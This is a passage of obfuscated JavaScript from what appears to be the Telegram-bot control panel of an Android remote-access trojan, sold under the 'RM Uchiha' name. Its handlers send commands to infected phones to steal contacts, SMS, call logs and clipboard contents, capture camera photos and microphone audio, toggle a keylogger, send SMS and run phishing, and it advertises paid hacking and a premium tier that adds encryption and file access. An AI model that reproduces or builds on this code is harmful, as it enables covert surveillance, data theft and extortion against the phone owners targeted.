                      bot.sendMessage(chatId, "<b>✯ If you want to hire us for any paid work please contact Romeo Uchiha\n𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\nADMIN → RM UCHIHA VIP 🩸</b>" + DISCLAIMER, {
                        'parse_mode': 'HTML'
                      });
                    } else {
                      if (_0xdbde0c.text === "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯") {
                        bot.sendMessage(chatId, "<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 👁️‍🗨️</b>\n\n", {
                          'parse_mode': "HTML",
                          'reply_markup': {
                            'keyboard': [
                              ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                              ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                            ],
                            'resize_keyboard': true
                          }
                        });
                      } else {
                        if (_0xdbde0c.text === "✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯") {
                          let _0x3202e5 = appData.get(tarKey) === "all" ? "all" : (io.sockets.sockets.get(appData.get(tarKey)) ? io.sockets.sockets.get(appData.get(tarKey)).model : "Unknown");
                          if (_0x3202e5 == "all") {
                            bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 🩸</b>\n\n", {
                              'parse_mode': "HTML",
                              'reply_markup': {
                                'keyboard': [
                                  ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"], 
                                  ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"], 
                                  ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"], 
                                  ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"], 
                                  ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"], 
                                  ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"], 
                                  ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"], 
                                  ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"], 
                                  ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"], 
                                  ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"], 
                                  ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"], 
                                  ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"], 
                                  ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"], 
                                  ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]
                                ],
                                'resize_keyboard': true,
                                'one_time_keyboard': true
                              }
                            });
                          } else {
                            bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x3202e5 + " 🩸</b>\n\n", {
                              'parse_mode': "HTML",
                              'reply_markup': {
                                'keyboard': [
                                  ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"], 
                                  ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"], 
                                  ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"], 
                                  ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"], 
                                  ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"], 
                                  ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"], 
                                  ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"], 
                                  ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"], 
                                  ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"], 
                                  ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"], 
                                  ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"], 
                                  ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"], 
                                  ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"], 
                                  ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]
                                ],
                                'resize_keyboard': true,
                                'one_time_keyboard': true
                              }
                            });
                          }
                        } else {
                          if (actions.includes(_0xdbde0c.text)) {
                            let _0x3ea82b = appData.get(tarKey);
                            if (_0xdbde0c.text === "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
                              if (_0x3ea82b == "all") {
                                emitToTargets("all", "contacts", [], chatId, activeBot);
                              } else {
                                emitToTargets(_0x3ea82b, 'contacts', [], chatId, activeBot);
                              }
                              appData["delete"](tarKey);
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝚂𝙼𝚂 ✯") {
                              if (_0x3ea82b == "all") {
                                emitToTargets("all", "all-sms", [], chatId, activeBot);
                              } else {
                                emitToTargets(_0x3ea82b, "all-sms", [], chatId, activeBot);
                              }
                              appData["delete"](tarKey);
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙲𝚊𝚕𝚕𝚜 ✯") {
                              if (_0x3ea82b == "all") {
                                emitToTargets("all", "calls", [], chatId, activeBot);
                              } else {
                                emitToTargets(_0x3ea82b, "calls", [], chatId, activeBot);
                              }
                              appData["delete"](tarKey);
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙰𝚙𝚙𝚜 ✯") {
                              if (_0x3ea82b == "all") {
                                emitToTargets("all", "apps", [], chatId, activeBot);
                              } else {
                                emitToTargets(_0x3ea82b, "apps", [], chatId, activeBot);
                              }
                              appData["delete"](tarKey);
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯") {
                              if (_0x3ea82b == "all") {
                                emitToTargets("all", "main-camera", [], chatId, activeBot);
                              } else {
                                emitToTargets(_0x3ea82b, "main-camera", [], chatId, activeBot);
                              }
                              appData["delete"](tarKey);
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯") {
                              if (_0x3ea82b == 'all') {
                                emitToTargets("all", "selfie-camera", [], chatId, activeBot);
                              } else {
                                emitToTargets(_0x3ea82b, 'selfie-camera', [], chatId, activeBot);
                              }
                              appData["delete"](tarKey);
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯") {
                              if (_0x3ea82b == "all") {
                                emitToTargets("all", "clipboard", [], chatId, activeBot);
                              } else {
                                emitToTargets(_0x3ea82b, "clipboard", [], chatId, activeBot);
                              }
                              appData["delete"](tarKey);
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯") {
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯") {
                              if (_0x3ea82b == "all") {
                                emitToTargets("all", "keylogger-on", [], chatId, activeBot);
                              } else {
                                emitToTargets(_0x3ea82b, "keylogger-on", [], chatId, activeBot);
                              }
                              appData["delete"](tarKey);
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯") {
                              if (_0x3ea82b == "all") {
                                emitToTargets("all", "keylogger-off", [], chatId, activeBot);
                              } else {
                                emitToTargets(_0x3ea82b, 'keylogger-off', [], chatId, activeBot);
                              }
                              appData["delete"](tarKey);
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯") {
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯") {
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯") {
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯") {
                              bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy RM UCHIHA 🩸</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], 
                                    ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯", "🔄 Switch Bot"]
                                  ],
                                  'resize_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯") {
                              appData.set(actKey, 'microphoneDuration');
                              bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 👁️‍🗨️</b>" + DISCLAIMER, {
                                'parse_mode': 'HTML',
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]
                                  ],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝚃𝚘𝚊𝚜𝚝 ✯") {
                              appData.set(actKey, "toastText");
                              bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡 👁️‍🗨️</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]
                                  ],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯") {
                              appData.set(actKey, "smsNumber");
                              bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂 👁️‍🗨️</b>" + DISCLAIMER, {
                                'parse_mode': 'HTML',
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]
                                  ],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            }
                            if (_0xdbde0c.text === "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯") {
                              appData.set(actKey, "vibrateDuration");
                              bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 👁️‍🗨️</b>" + DISCLAIMER, {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [
                                    ["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]
